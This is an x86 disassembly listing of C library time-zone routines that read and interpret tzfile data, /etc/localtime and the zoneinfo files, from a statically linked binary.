cmp eax, dword [edi + 8]
jae 0x808f458
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 1
ja 0x808f400
mov eax, dword [0x80aaaf4]
mov ecx, dword [var_48h_2]
mov byte [eax + ecx*8 + 4], dl
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f449
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, dword [var_5ch_2]
ja 0x808f400
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 5], dl
mov edx, dword [0x80aaaf4]
mov eax, dword [var_40h]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ebx*8], eax
inc ebx
cmp ebx, dword [0x80aaaf0]
mov dword [var_48h_2], ebx
jb 0x808efa0
mov esi, dword [var_5ch]
mov eax, dword [0x80aaaf8]
mov dword [var_sp_ch], edi
mov dword [var_4h], 1
mov dword [var_8h], esi
mov dword [esp], eax
call fcn.08090dc0
cmp eax, esi
jne 0x808f400
xor eax, eax
mov dword [var_48h], 0
cmp eax, dword [0x80aab04]
jae 0x808f139
lea esi, [var_44h]
mov ebx, 4
lea esi, [esi]
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f43a
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f0ae
mov byte [esi], dl
inc esi
dec ebx
jne 0x808f090
mov eax, 4
sub eax, ebx
cmp eax, 4
jne 0x808f400
mov edx, dword [0x80aab08]
mov ecx, dword [var_48h_2]
lea esi, [var_44h]
mov eax, dword [var_44h]
mov ebx, 4
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ecx*8], eax
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f42b
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f0fe
mov byte [esi], dl
inc esi
dec ebx
jne 0x808f0e0
mov eax, 4
sub eax, ebx
cmp eax, 4
jne 0x808f400
mov ebx, dword [var_48h_2]
mov edx, dword [0x80aab08]
mov eax, dword [var_44h]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ebx*8 + 4], eax
inc ebx
cmp ebx, dword [0x80aab04]
mov dword [var_48h_2], ebx
jb 0x808f082
mov dword [var_48h], 0
mov esi, dword [var_60h]
cmp dword [var_48h], esi
jae 0x808f17e
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f41c
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f400
test edx, edx
mov eax, dword [0x80aaaf4]
mov edx, dword [var_48h_2]
setne byte [eax + edx*8 + 6]
inc edx
mov ecx, dword [var_60h_2]
mov dword [var_48h_2], edx
cmp edx, ecx
jb 0x808f148
mov ecx, dword [0x80aaaf0]
cmp dword [var_48h], ecx
jae 0x808f1a4
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 6], 0
mov ecx, dword [0x80aaaf0]
inc ebx
mov dword [var_48h_2], ebx
cmp ebx, ecx
jb 0x808f189
mov dword [var_48h], 0
mov esi, dword [var_64h]
cmp dword [var_48h], esi
jae 0x808f1ef
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f40d
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f400
test edx, edx
mov eax, dword [0x80aaaf4]
mov edx, dword [var_48h_2]
setne byte [eax + edx*8 + 7]
inc edx
mov ecx, dword [var_64h_2]
mov dword [var_48h_2], edx
cmp edx, ecx
jb 0x808f1b3
mov ecx, dword [0x80aaaf0]
cmp dword [var_48h], ecx
jae 0x808f20d
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 7], 0
inc ebx
cmp ebx, dword [0x80aaaf0]
mov dword [var_48h_2], ebx
jb 0x808f1f4
mov dword [esp], edi
xor esi, esi
call fcn.08049dc0
cmp esi, dword [0x80aaaf0]
mov dword [var_48h], 0
jb 0x808f3d4
mov eax, dword [0x80aaae8]
mov dword [0x80a9c28], 0
mov dword [0x80a9c2c], 0
test eax, eax
mov dword [var_48h], eax
je 0x808f279
dec dword [var_48h_2]
mov eax, dword [0x80aaaec]
mov ecx, dword [var_48h_2]
movzx edx, byte [ecx + eax]
mov eax, dword [0x80aaaf4]
movzx ebx, byte [eax + edx*8 + 4]
mov esi, dword [ebx*4 + 0x80a9c28]
test esi, esi
je 0x808f39f
mov ecx, dword [var_48h_2]
test ecx, ecx
jne 0x808f24a
mov edx, dword [0x80a9c28]
test edx, edx
jne 0x808f2a2
cmp dword [0x80aaaf0], 1
jne 0x808f4e7
mov eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [0x80a9c28], eax
mov eax, dword [0x80a9c2c]
test eax, eax
jne 0x808f2b5
mov eax, dword [0x80a9c28]
mov dword [0x80a9c2c], eax
mov eax, dword [var_5ch]
call fcn.0808f900
mov eax, dword [0x80aaae8]
test eax, eax
jne 0x808f300
mov eax, dword [0x80aaaf4]
mov eax, dword [eax]
mov edx, eax
mov dword [0x80aab00], eax
mov dword [0x80aaafc], eax
xor eax, eax
mov dword [0x80aad48], 1
cmp edx, dword [0x80aab00]
setne al
neg edx
mov dword [0x80aaa64], edx
mov dword [0x80aaa60], eax
jmp 0x808ed28
dec eax
xor ecx, ecx
xor ebx, ebx
mov dword [0x80aab00], 0
mov dword [0x80aaafc], 0
mov dword [var_48h], eax
mov esi, dword [0x80aaaec]
test ecx, ecx
jne 0x808f375
mov edi, dword [var_48h]
mov eax, dword [0x80aaaf4]
movzx edx, byte [edi + esi]
cmp byte [eax + edx*8 + 4], 0
jne 0x808f375
mov edx, dword [eax + edx*8]
mov ecx, 1
mov dword [0x80aaafc], edx
test ebx, ebx
jne 0x808f36a
mov eax, dword [var_48h]
dec dword [var_48h]
test eax, eax
jne 0x808f322
test ebx, ebx
jne 0x808f36a
mov edx, dword [0x80aaafc]
mov dword [0x80aab00], edx
jmp 0x808f2d9
mov edx, dword [0x80aaafc]
jmp 0x808f2d9
test ebx, ebx
jne 0x808f399
mov eax, dword [var_48h]
movzx edx, byte [eax + esi]
mov eax, dword [0x80aaaf4]
cmp byte [eax + edx*8 + 4], 0
je 0x808f399
mov eax, dword [eax + edx*8]
mov ebx, 1
mov dword [0x80aab00], eax
test ecx, ecx
je 0x808f34b
jmp 0x808f347
movzx eax, byte [eax + edx*8 + 5]
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [ebx*4 + 0x80a9c28], eax
mov eax, 1
sub eax, ebx
mov ebx, dword [eax*4 + 0x80a9c28]
test ebx, ebx
je 0x808f272
jmp 0x808f279
mov edi, dword [var_48h]
mov eax, dword [0x80aaaf4]
movzx eax, byte [eax + edi*8 + 5]
inc edi
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
cmp edi, dword [0x80aaaf0]
mov dword [var_48h], edi
jb 0x808f3d4
jmp 0x808f22a
mov dword [esp], edi
call fcn.08049dc0
jmp 0x808ed28
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f1c6
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f15b
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f0f3
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f0a3
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f009
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808efe1
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808efbb
mov ecx, dword [0x80aaaf0]
jmp 0x808ef5f
mov ecx, dword [var_54h]
mov dword [esp], ecx
call fcn.08053400
mov dword [var_58h], eax
jmp 0x808ed64
mov eax, str._etc_localtime
mov ecx, 0xf
mov esi, edx
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x808ed11
mov esi, dword [var_4h]
mov eax, str._usr_share_zoneinfo
mov ecx, 0x13
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x808ed28
jmp 0x808ed11
movzx eax, byte [str._etc_localtime]
mov dword [arg_8h], str._etc_localtime
jmp 0x808ed36
mov dword [esp], eax
call fcn.08051180
jmp 0x808ece0
mov dword [var_sp_ch], str.__tzfile_read
mov dword [var_8h], 0x13c
mov dword [var_4h], str.tzfile.c
mov dword [esp], str.num_types__1
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
mov ebx, dword [0x80aaae0]
mov edi, eax
test ebx, ebx
mov esi, ebx
je 0x808de8c
mov eax, dword [esi + 4]
cmp edi, eax
ja 0x808de84
sub eax, edi
lea ebx, [eax + esi + 8]
mov eax, dword [arg_8h]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08076e50
mov edx, ebx
test eax, eax
je 0x808dec2
mov ebx, esi
mov esi, dword [esi]
test esi, esi
jne 0x808de62
lea eax, [edi + 9]
mov dword [esp], eax
call fcn.08050fe0
xor edx, edx
test eax, eax
mov esi, eax
je 0x808dec2
mov dword [eax + 4], edi
mov dword [eax], 0
lea edi, [esi + 8]
mov eax, dword [arg_8h]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.0808dc90
test ebx, ebx
je 0x808decc
mov dword [ebx], esi
mov edx, edi
add esp, 8
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [0x80aaae0], esi
jmp 0x808dec0
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_8h]
lea edi, [eax + 1]
mov dword [esp], edx
call fcn.08053400
mov dword [esp], str.posixrules
lea ebx, [eax + 1]
lea eax, [var_10h]
mov dword [var_8h_2], eax
lea eax, [ebx + edi]
mov dword [var_18h_2], eax
mov dword [var_4h_2], eax
call fcn.0808ecc0
mov eax, dword [0x80aad48]
test eax, eax
je 0x808f56e
cmp dword [0x80aaaf0], 1
ja 0x808f576
mov dword [0x80aad48], 0
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_4h]
mov eax, dword [var_10h]
mov dword [var_8h_2], edi
xor esi, esi
mov dword [var_4h_2], edx
mov dword [esp], eax
call fcn.08053740
mov edx, dword [var_8h]
mov dword [esp], eax
mov dword [var_8h_2], ebx
mov dword [var_4h_2], edx
call fcn.08053740
cmp esi, dword [0x80aaae8]
mov eax, dword [var_10h]
mov dword [0x80aaaf0], 2
mov dword [var_14h_2], 0
mov dword [0x80aaaf8], eax
jae 0x808f618
mov ecx, dword [0x80aaaec]
mov eax, dword [0x80aaaf4]
movzx edx, byte [esi + ecx]
lea ebx, [eax + edx*8]
movzx eax, byte [ebx + 4]
mov byte [esi + ecx], al
cmp byte [ebx + 7], 0
jne 0x808f608
mov eax, dword [var_14h_2]
test eax, eax
je 0x808f685
cmp byte [ebx + 6], 0
jne 0x808f685
mov eax, dword [var_64h]
mov edx, dword [0x80aad9c]
sub eax, dword [0x80aab00]
add dword [edx + esi*4], eax
movzx ebx, byte [ebx + 4]
inc esi
cmp esi, dword [0x80aaae8]
mov dword [var_14h_2], ebx
jb 0x808f5c2
mov eax, dword [var_sp_ch]
mov edx, dword [var_64h]
mov dword [0x80aaafc], eax
mov dword [0x80aab00], edx
mov eax, dword [0x80aaaf4]
mov byte [eax + 5], 0
mov edx, dword [var_sp_ch]
mov eax, dword [0x80aaaf4]
mov byte [eax + 4], 0
mov dword [eax], edx
mov edx, edi
mov eax, dword [0x80aaaf4]
mov byte [eax + 0xd], dl
mov edx, dword [var_64h]
mov eax, dword [0x80aaaf4]
mov byte [eax + 0xc], 1
mov dword [eax + 8], edx
mov edx, dword [var_8h]
mov eax, dword [var_4h]
mov dword [0x80a9c2c], edx
mov dword [0x80a9c28], eax
mov eax, dword [0x80aaaf4]
mov eax, dword [eax]
neg eax
mov dword [0x80aaa64], eax
mov eax, dword [var_18h_2]
call fcn.0808f900
jmp 0x808f56e
mov eax, dword [var_sp_ch]
mov edx, dword [0x80aad9c]
sub eax, dword [0x80aaafc]
jmp 0x808f605
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, edx
push ebx
sub esp, 0x18
cmp edx, 0xffffffff
je 0x808e847
cmp dword [eax + 0x1c], edx
je 0x808e8c5
cmp esi, 0x7b2
mov dword [var_10h], 0
jle 0x808e898
mov ebx, esi
mov ecx, esi
lea eax, [esi + 2]
imul ebx, ebx, 0x16d
dec ecx
mov edx, 0x51eb851f
cmovns eax, ecx
sar eax, 2
add ebx, eax
mov eax, ecx
sar ecx, 0x1f
imul edx
sar edx, 5
mov eax, edx
sar edx, 2
sub eax, ecx
sub edx, ecx
sub ebx, eax
lea ebx, [edx + ebx - 0xafaa7]
mov edx, ebx
imul edx, edx, 0x15180
mov dword [var_10h], edx
mov eax, dword [edi + 4]
cmp eax, 1
je 0x808ea44
jb 0x808ea32
cmp eax, 2
je 0x808e8cd
nop
mov eax, dword [edi + 0x14]
mov edx, dword [edi + 0x10]
mov dword [edi + 0x1c], esi
sub dword [var_10h], eax
add dword [var_10h], edx
mov eax, dword [var_10h]
mov dword [edi + 0x18], eax
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
test esi, 3
jne 0x808e905
mov eax, 0x51eb851f
mov ebx, esi
imul esi
sar ebx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ebx
imul eax, eax, 0x64
cmp esi, eax
jne 0x808e900
sar edx, 7
sub edx, ebx
imul edx, edx, 0x190
cmp esi, edx
jne 0x808e905
mov ecx, 1
movzx ebx, word [edi + 8]
lea eax, [ecx + ecx]
add eax, ecx
lea eax, [ecx + eax*4]
movzx ecx, bx
add eax, ecx
add ecx, 9
add eax, eax
movzx edx, word [eax + 0x80a733e]
mov dword [var_14h], eax
mov eax, edx
mov dword [var_18h], edx
mov edx, 0x2aaaaaab
imul eax, eax, 0x15180
add dword [var_10h], eax
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 1
sub edx, eax
mov eax, 0x51eb851f
lea edx, [edx + edx*2]
shl edx, 2
sub ecx, edx
cmp bx, 2
lea edx, [esi - 1]
cmova edx, esi
mov dword [var_20h], edx
imul edx
mov eax, dword [var_20h]
imul ecx, ecx, 0x1a
sar eax, 0x1f
mov ebx, edx
mov edx, dword [var_20h]
sar ebx, 5
sub ebx, eax
add ecx, 0x18
imul eax, ebx, 0x64
sub edx, eax
mov eax, 0x66666667
mov dword [var_20h], edx
imul ecx
mov eax, dword [var_20h]
sar ecx, 0x1f
add eax, 3
sar edx, 2
sub edx, ecx
mov ecx, edx
add ecx, dword [var_20h]
cmp dword [var_20h], 0xffffffff
cmovg eax, dword [var_20h]
sar eax, 2
cmp ebx, 0xffffffff
lea edx, [eax + ecx]
lea eax, [ebx + 3]
cmovg eax, ebx
sar eax, 2
lea eax, [eax + edx]
lea edx, [ebx + ebx]
mov ebx, 1
sub eax, edx
mov edx, 0x92492493
lea ecx, [eax + 1]
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
add edx, ecx
sar edx, 2
sub edx, eax
lea eax, [edx*8]
sub eax, edx
mov edx, ecx
movzx ecx, word [edi + 0xc]
sub edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 7]
cmovle edx, eax
sub ecx, edx
movzx edx, word [edi + 0xa]
cmp ecx, 0xffffffff
lea eax, [ecx + 7]
cmovle ecx, eax
cmp ebx, edx
mov dword [var_1ch], edx
jae 0x808ea24
mov edx, dword [var_14h]
movzx eax, word [edx + 0x80a7340]
sub eax, dword [var_18h]
lea edx, [ecx + 7]
cmp edx, eax
jge 0x808ea24
inc ebx
mov ecx, edx
cmp ebx, dword [var_1ch]
jb 0x808ea15
imul ecx, ecx, 0x15180
add dword [var_10h], ecx
jmp 0x808e8b0
movzx eax, word [edi + 0xc]
imul eax, eax, 0x15180
add dword [var_10h], eax
jmp 0x808e8b0
movzx edx, word [edi + 0xc]
mov ecx, dword [var_10h]
movzx eax, dx
imul eax, eax, 0x15180
add ecx, eax
cmp dx, 0x3b
lea eax, [ecx - 0x15180]
mov dword [var_10h], eax
jbe 0x808e8b0
test esi, 3
jne 0x808e8b0
mov eax, 0x51eb851f
mov ebx, esi
imul esi
sar ebx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ebx
imul eax, eax, 0x64
cmp esi, eax
jne 0x808eaa2
sar edx, 7
sub edx, ebx
imul edx, edx, 0x190
cmp esi, edx
jne 0x808e8b0
mov dword [var_10h], ecx
jmp 0x808e8b0
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ecx, dword [arg_ch]
mov edi, dword [arg_8h]
test ecx, ecx
jne 0x808f7cf
mov eax, dword [arg_10h]
mov edx, dword [arg_14h]
mov dword [eax], 0
mov dword [edx], 0
mov ebx, dword [0x80aab04]
nop
dec ebx
cmp ebx, 0xffffffff
je 0x808f76f
mov edx, dword [0x80aab08]
cmp edi, dword [edx + ebx*8]
jl 0x808f750
mov eax, dword [edx + ebx*8 + 4]
mov ecx, dword [arg_10h]
mov dword [ecx], eax
cmp edi, dword [edx + ebx*8]
je 0x808f777
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
test ebx, ebx
jne 0x808f7c3
mov eax, dword [edx + 4]
test eax, eax
jle 0x808f7c3
mov eax, dword [arg_14h]
test ebx, ebx
mov dword [eax], 1
je 0x808f76f
mov eax, dword [edx + ebx*8 - 8]
inc eax
cmp dword [edx + ebx*8], eax
jne 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
inc eax
cmp dword [edx + ebx*8 + 4], eax
jne 0x808f76f
mov ecx, dword [arg_14h]
inc dword [ecx]
dec ebx
je 0x808f76f
mov eax, dword [edx + ebx*8 - 8]
inc eax
cmp dword [edx + ebx*8], eax
jne 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
inc eax
cmp dword [edx + ebx*8 + 4], eax
je 0x808f7a4
jmp 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
cmp dword [edx + ebx*8 + 4], eax
jle 0x808f76f
jmp 0x808f782
mov eax, edi
call fcn.0808f6a0
mov ebx, dword [0x80aaae8]
mov dword [0x80a9c2c], 0
mov edx, dword [0x80aaafc]
mov dword [var_10h], eax
mov dword [0x80a9c28], 0
xor eax, eax
cmp edx, dword [0x80aab00]
setne al
neg edx
test ebx, ebx
mov dword [0x80aaa64], edx
mov dword [0x80aaa60], eax
je 0x808f83d
mov eax, dword [0x80aaaec]
dec ebx
movzx edx, byte [ebx + eax]
mov eax, dword [0x80aaaf4]
movzx esi, byte [eax + edx*8 + 4]
movzx eax, byte [eax + edx*8 + 5]
mov edx, dword [esi*4 + 0x80a9c28]
test edx, edx
je 0x808f8aa
test ebx, ebx
jne 0x808f815
mov eax, dword [0x80a9c28]
test eax, eax
jne 0x808f865
cmp dword [0x80aaaf0], 1
jne 0x808f8da
mov eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [0x80a9c28], eax
mov eax, dword [0x80a9c2c]
test eax, eax
jne 0x808f878
mov eax, dword [0x80a9c28]
mov dword [0x80a9c2c], eax
mov edx, dword [var_10h]
mov ecx, dword [arg_18h]
movzx eax, byte [edx + 4]
mov dword [ecx + 0x20], eax
movzx eax, byte [edx + 5]
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov ecx, dword [var_10h]
mov edx, dword [arg_18h]
mov dword [edx + 0x28], eax
mov eax, dword [ecx]
mov dword [edx + 0x24], eax
jmp 0x808f737
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [esi*4 + 0x80a9c28], eax
mov eax, 1
sub eax, esi
mov eax, dword [eax*4 + 0x80a9c28]
test eax, eax
je 0x808f839
jmp 0x808f83d
mov dword [var_ch], str.__tzfile_compute
mov dword [var_8h], 0x201
mov dword [var_4h], str.tzfile.c
mov dword [esp], str.num_types__1
call fcn.0805efc0
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
mov esi, 0xc22e4507
push ebx
sub esp, 0x58
mov eax, dword [arg_8h]
mov ebx, dword [eax]
mov eax, esi
imul ebx
mov eax, ebx
mov ecx, ebx
sar eax, 0x1f
mov esi, edx
add esi, ebx
mov dword [var_10h], esi
sar dword [var_10h], 0x10
sub dword [var_10h], eax
mov eax, dword [var_10h]
imul eax, eax, 0x15180
sub ecx, eax
add ecx, dword [arg_ch]
js 0x8091245
cmp ecx, 0x1517f
jle 0x8090f59
sub ecx, 0x15180
inc dword [var_10h]
cmp ecx, 0x1517f
jg 0x8090f48
mov ebx, 0x91a2b3c5
mov esi, ecx
mov eax, ebx
imul ecx
mov eax, ecx
sar eax, 0x1f
mov ebx, edx
add ebx, ecx
mov ecx, dword [arg_10h]
sar ebx, 0xb
sub ebx, eax
mov eax, dword [arg_10h]
mov dword [eax + 8], ebx
mov eax, ebx
mov ebx, 0x88888889
imul eax, eax, 0xe10
sub esi, eax
mov eax, ebx
imul esi
mov eax, esi
sar eax, 0x1f
mov ebx, edx
add ebx, esi
sar ebx, 5
sub ebx, eax
mov eax, ebx
mov dword [ecx + 4], ebx
shl eax, 4
sub eax, ebx
mov ebx, 0x92492493
shl eax, 2
sub esi, eax
mov eax, ebx
mov dword [ecx], esi
mov esi, dword [var_10h]
add esi, 4
imul esi
mov eax, esi
sar eax, 0x1f
mov ebx, edx
add ebx, esi
sar ebx, 2
sub ebx, eax
lea eax, [ebx*8]
sub eax, ebx
sub esi, eax
test esi, esi
mov eax, esi
mov dword [ecx + 0x18], esi
js 0x809123a
mov dword [var_14h], 0x7b2
lea esi, [esi]
mov eax, dword [var_10h]
test eax, eax
js 0x8091043
test byte [var_14h], 3
jne 0x809122e
mov eax, dword [var_14h]
mov edx, 0x51eb851f
mov ecx, dword [var_14h]
imul edx
sar ecx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ecx
imul eax, eax, 0x64
cmp dword [var_14h], eax
jne 0x8091036
mov eax, edx
sar eax, 7
sub eax, ecx
imul eax, eax, 0x190
cmp dword [var_14h], eax
jne 0x809122e
cmp dword [var_10h], 0x16d
jle 0x8091188
mov eax, dword [var_10h]
mov ecx, 0xb38cf9b1
imul ecx
mov eax, dword [var_10h]
add edx, dword [var_10h]
sar eax, 0x1f
sar edx, 8
sub edx, eax
mov eax, dword [var_14h]
mov ecx, edx
imul ecx, ecx, 0x16d
add eax, edx
mov edx, dword [var_10h]
sub edx, ecx
shr edx, 0x1f
sub eax, edx
mov dword [var_18h], eax
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, 2
imul eax, eax, 0x16d
mov dword [var_28h], eax
mov eax, dword [var_18h]
dec eax
mov dword [var_30h], eax
cmovs eax, ecx
mov ecx, dword [var_30h]
sar eax, 2
mov dword [var_2ch], eax
mov eax, 0x51eb851f
imul dword [var_30h]
sar ecx, 0x1f
mov dword [var_38h], ecx
sar edx, 5
mov ebx, edx
sar edx, 2
sub ebx, ecx
mov ecx, dword [var_30h]
imul eax, ebx, 0x64
sub ecx, eax
mov eax, dword [var_38h]
shr ecx, 0x1f
sub ebx, ecx
sub edx, eax
mov ecx, ebx
mov ebx, dword [var_30h]
mov eax, edx
imul eax, eax, 0x190
sub ebx, eax
mov eax, dword [var_2ch]
shr ebx, 0x1f
sub edx, ebx
mov ebx, edx
shl eax, 2
mov edx, dword [var_2ch]
sub dword [var_30h], eax
mov eax, dword [var_28h]
shr dword [var_30h], 0x1f
mov dword [var_40h], edx
sub dword [var_40h], ecx
mov ecx, dword [var_30h]
add ebx, dword [var_40h]
mov dword [var_44h], ebx
sub dword [var_44h], ecx
add eax, dword [var_44h]
mov dword [var_48h], eax
mov ebx, dword [var_14h]
mov eax, dword [var_14h]
add eax, 2
dec ebx
cmovns eax, ebx
mov ecx, ebx
sar eax, 2
sar ecx, 0x1f
mov dword [var_4ch], eax
mov dword [var_54h], ecx
mov eax, 0x51eb851f
imul ebx
sar edx, 5
mov esi, edx
mov edi, edx
mov edx, ebx
sub esi, ecx
sar edi, 2
mov ecx, ebx
imul eax, esi, 0x64
sub edi, dword [var_54h]
sub ecx, eax
mov eax, edi
imul eax, eax, 0x190
shr ecx, 0x1f
sub esi, ecx
mov ecx, dword [var_4ch]
mov dword [var_50h], esi
sub edx, eax
mov dword [var_5ch], ecx
mov eax, dword [var_4ch]
sub dword [var_5ch], esi
shr edx, 0x1f
mov ecx, dword [var_18h]
sub edi, edx
shl eax, 2
mov dword [var_58h], edi
sub ebx, eax
mov dword [var_14h], ecx
mov eax, dword [var_5ch]
shr ebx, 0x1f
add eax, edi
sub eax, ebx
sub dword [var_48h], eax
mov edx, dword [var_48h]
sub dword [var_10h], edx
jmp 0x8090ff0
mov eax, dword [var_14h]
xor ebx, ebx
mov edx, dword [arg_10h]
mov ecx, dword [var_10h]
sub eax, 0x76c
test byte [var_14h], 3
mov dword [edx + 0x14], eax
mov dword [edx + 0x1c], ecx
jne 0x80911da
mov eax, dword [var_14h]
mov edx, 0x51eb851f
mov ecx, dword [var_14h]
imul edx
sar ecx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ecx
imul eax, eax, 0x64
cmp dword [var_14h], eax
jne 0x80911d5
mov eax, edx
sar eax, 7
sub eax, ecx
imul eax, eax, 0x190
cmp dword [var_14h], eax
jne 0x80911da
mov ebx, 1
imul eax, ebx, 0x1a
mov dword [var_14h], 0xb
lea ecx, [eax + 0x80a7340]
movzx eax, word [ecx + 0x16]
cmp dword [var_10h], eax
jge 0x8091228
dec dword [var_14h]
mov eax, dword [var_14h]
movzx edx, word [ecx + eax*2]
movzx eax, dx
cmp dword [var_10h], eax
jl 0x80911f3
movzx eax, dx
mov ecx, dword [arg_10h]
mov edx, dword [var_14h]
sub dword [var_10h], eax
mov eax, dword [var_10h]
mov dword [ecx + 0x10], edx
inc eax
mov dword [ecx + 0xc], eax
add esp, 0x58
mov eax, 1
pop ebx
pop esi
pop edi
leave
ret
movzx edx, word [ecx + 0x16]
jmp 0x8091205
cmp dword [var_10h], 0x16c
jmp 0x809103d
add eax, 7
mov dword [ecx + 0x18], eax
jmp 0x8090fe2
dec dword [var_10h]
add ecx, 0x15180
js 0x8091245
jmp 0x8090f40
push ebp
mov ebp, esp
push ebx
mov edx, dword [eax + 0x14]
mov ebx, eax
mov eax, 0x80aaaa0
add edx, 0x76c
call fcn.0808e830
mov edx, dword [ebx + 0x14]
mov eax, 0x80aaac0
mov ebx, dword [esp]
leave
add edx, 0x76c
jmp fcn.0808e830
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov ebx, edi
imul ebx, esi
test ebx, ebx
jne 0x8090deb
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [arg_8h]
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0804dd00
mov ecx, esi
cmp ebx, eax
je 0x8090e0d
xor edx, edx
div edi
mov ecx, eax
mov eax, ecx
jmp 0x8090de0
mov ecx, dword [0x80aaaf8]
push ebp
mov ebp, esp
push ebx
lea ebx, [eax + ecx]
lea esi, [esi]
cmp byte [ecx], 0
mov eax, ecx
je 0x808f91d
inc ecx
cmp byte [ecx], 0
jne 0x808f917
mov edx, ecx
sub edx, eax
mov eax, dword [0x80aad44]
cmp edx, eax
cmova eax, edx
inc ecx
cmp ecx, ebx
mov dword [0x80aad44], eax
jb 0x808f910
pop ebx
leave
ret
mov ecx, dword [0x80aaae8]
push ebp
mov ebp, esp
push ebx
test ecx, ecx
je 0x808f6b8
mov ebx, dword [0x80aad9c]
cmp eax, dword [ebx]
jge 0x808f6f8
mov eax, dword [0x80aaaf0]
xor edx, edx
cmp edx, eax
jae 0x808f6f0
mov ecx, dword [0x80aaaf4]
cmp byte [ecx + 4], 0
mov ebx, ecx
je 0x808f6e0
inc edx
cmp edx, eax
jae 0x808f6e0
cmp byte [ebx + edx*8 + 4], 0
jne 0x808f6d1
lea esi, [esi]
cmp edx, eax
je 0x808f6ec
mov ebx, dword [esp]
lea eax, [ecx + edx*8]
leave
ret
xor edx, edx
jmp 0x808f6e4
mov ecx, dword [0x80aaaf4]
jmp 0x808f6e0
mov edx, 1
cmp edx, ecx
jae 0x808f70b
cmp eax, dword [ebx + edx*4]
jl 0x808f70b
inc edx
cmp edx, ecx
jb 0x808f701
mov eax, dword [0x80aaaec]
mov ecx, dword [0x80aaaf4]
movzx edx, byte [edx + eax - 1]
jmp 0x808f6e4
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, str._dev_null
call fcn.08048b20
mov ecx, 0x10800
mov edx, eax
mov esi, dword [eax]
mov eax, 5
int 0x80
cmp eax, 0xfffff000
ja 0x808f9a8
test eax, eax
js 0x808f995
mov ebx, eax
mov eax, 6
int 0x80
mov dword [0x80aab0c], 0xffffffff
call fcn.08048b20
mov dword [eax], esi
mov esi, dword [var_4h]
mov ebx, dword [esp]
leave
ret
xor eax, eax
cmp dword [edx], 0x14
sete al
lea eax, [eax + eax - 1]
mov dword [0x80aab0c], eax
jmp 0x808f985
neg eax
mov dword [edx], eax
